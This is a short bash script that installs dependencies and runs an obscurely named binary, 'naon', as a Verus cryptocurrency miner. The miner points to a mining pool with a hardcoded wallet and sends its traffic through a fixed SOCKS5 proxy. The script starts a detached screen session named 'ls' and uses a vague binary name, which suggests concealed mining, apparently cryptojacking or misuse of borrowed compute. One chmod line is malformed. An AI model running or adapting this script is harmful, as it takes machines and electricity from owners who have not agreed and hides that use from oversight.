#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x start89.sh && chmod +x naon chmod 777 naon start89.sh
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RVDKJwu7n8mr6rr3qfeRREzknW6bbKQRHN
WORKER=$(echo $(shuf -i 1-1 -n 1)JOSS)
PROXY=socks5://72.223.168.86:57481
./naon -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
